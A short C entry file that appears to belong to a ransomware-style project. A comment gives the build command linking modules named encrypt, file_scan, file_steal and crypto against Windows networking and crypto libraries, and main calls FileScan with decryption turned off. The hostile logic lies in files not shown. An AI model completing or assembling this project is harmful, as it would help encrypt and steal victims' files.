#include "file_scan.h"

#include <stdbool.h>

int main() {
    // if ($?) { gcc encrypt.c file_scan.c file_steal.c crypto.c -o encrypt -lwininet -ladvapi32 -lcrypt32 -lws2_32 } ; if ($?) { .\encrypt }
    bool decryptMode = false;
    FileScan(decryptMode);
    return 0;
}